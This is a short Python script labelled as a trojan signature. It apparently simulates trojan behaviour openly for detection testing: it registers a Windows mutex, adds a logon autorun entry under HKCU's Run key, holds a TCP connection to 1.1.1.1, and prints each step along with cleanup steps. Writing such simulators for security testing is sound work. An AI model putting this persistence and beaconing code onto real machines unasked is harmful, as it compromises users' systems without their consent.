# TROJAN_SIGNATURE_V1
import ctypes
import os
import time
import socket
import winreg
import threading

_REG_KEY  = r"Software\Microsoft\Windows\CurrentVersion\Run"
_REG_NAME = "Trojan"

ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\TrojanMutex")


def _add_autorun():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _REG_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, _REG_NAME, 0, winreg.REG_SZ, f'python "{os.path.abspath(__file__)}"')
    winreg.CloseKey(key)


def _hold_connection():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("1.1.1.1", 80))
            while True:
                time.sleep(30)
        except Exception:
            pass
        time.sleep(5)


if __name__ == "__main__":
    print("[Trojan] Adding autorun key HKCU\\Run\\Trojan ...")
    _add_autorun()
    print("[Trojan] Done.")

    threading.Thread(target=_hold_connection, daemon=True).start()
    print("[Trojan] TCP connection active -> 1.1.1.1:80")

    print("[Trojan] Running. Stop with Ctrl+C or Task Manager.")
    print("[Trojan] Cleanup: regedit -> HKCU\\Run -> delete 'Trojan'")
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("[Trojan] Stopped.")
